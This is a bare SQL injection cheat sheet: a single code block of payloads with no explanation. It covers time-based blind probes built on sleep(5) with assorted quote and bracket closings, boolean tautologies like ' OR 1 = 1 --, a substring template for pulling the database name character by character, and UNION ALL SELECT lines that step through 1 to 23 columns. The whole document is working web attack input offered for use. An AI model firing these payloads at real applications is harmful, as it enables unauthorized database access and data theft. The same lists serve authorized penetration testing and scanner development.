Cheatsheet payloads sql injection.
```
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
' OR 1 = 1 -- 
' OR BINARY substring(database(), %d, 1) = '%s' -- 
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4,5
UNION ALL SELECT 1,2,3,4,5,6
UNION ALL SELECT 1,2,3,4,5,6,7
UNION ALL SELECT 1,2,3,4,5,6,7,8
UNION ALL SELECT 1,2,3,4,5,6,7,8,9
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
```
